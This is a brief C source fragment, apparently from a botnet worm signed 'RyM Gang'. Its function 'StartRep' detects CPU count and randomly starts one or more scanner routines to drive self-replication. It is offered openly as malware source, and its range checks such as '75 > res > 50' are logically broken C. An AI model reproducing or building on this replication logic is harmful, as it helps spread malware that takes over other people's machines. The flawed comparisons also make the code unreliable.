//Self-Replication Initiation

void StartRep(void)
{
	#ifdef DEBUG
		printf("[Rep Init] Generating Integer and Detecting CPUs");
	#endif
	int res = 0;
    procs = sysconf(_SC_NPROCESSORS_ONLN);
	
	srand(time(NULL));
	res = rand() % 100;
	
	#ifdef DEBUG
		printf("[Rep Init] Generated:[ int: %d | CPUs: %d ]", res, procs);
	#endif
	//Free Processors, Run Scanners until No Free CPUs
	if(procs > 1)
	{
		#ifdef DEBUG
			printf("[Rep Init] 2 or more Processors Detected, Starting some Scanners.");
		#endif
		scanner_init();
		another_scanner_init();
		aanother_scanner_init();
	} 
    else if(75 > res > 50)
	{
    scanner_init();
	} 
    else if(100 > res > 76)
	{
	another_scanner_init();
	} 
    else if(49 > res)
	{
	aanother_scanner_init();
	}
	
} //RyM Gang